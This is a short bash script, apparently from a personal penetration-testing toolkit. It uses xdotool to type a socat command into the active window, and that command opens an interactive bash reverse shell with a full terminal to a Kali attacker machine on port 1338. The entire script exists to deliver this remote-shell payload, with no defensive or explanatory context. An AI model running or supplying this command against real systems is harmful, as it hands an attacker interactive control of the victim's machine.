#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

command="socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${KALI_IP}:1338"
xdotool type "${command}"
